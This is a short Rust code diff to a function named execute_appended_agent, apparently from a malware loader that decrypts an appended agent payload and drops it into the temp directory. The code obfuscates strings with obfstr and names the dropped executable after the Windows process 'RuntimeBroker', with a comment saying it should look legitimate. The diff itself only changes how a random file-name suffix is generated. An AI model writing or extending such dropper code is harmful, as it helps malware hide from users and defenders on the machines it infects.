@@ -137,6 +137,7 @@ fn execute_appended_agent(
     encrypted_agent: &[u8],
 ) -> Result<(), Box<dyn std::error::Error>> {
     use obfstr::obfstr;
+    use rand::Rng;
     use std::fs::File;
     use std::io::Write;
     use std::os::windows::process::CommandExt;
@@ -147,7 +148,7 @@ fn execute_appended_agent(
 
     // Create temp file with random name that looks legitimate
     let temp_dir = std::env::temp_dir();
-    let random_suffix: u32 = rand::random();
+    let random_suffix: u32 = rand::thread_rng().gen();
     let exe_name = format!("{}_{}.exe", obfstr!("RuntimeBroker"), random_suffix);
     let exe_path = temp_dir.join(&exe_name);
 
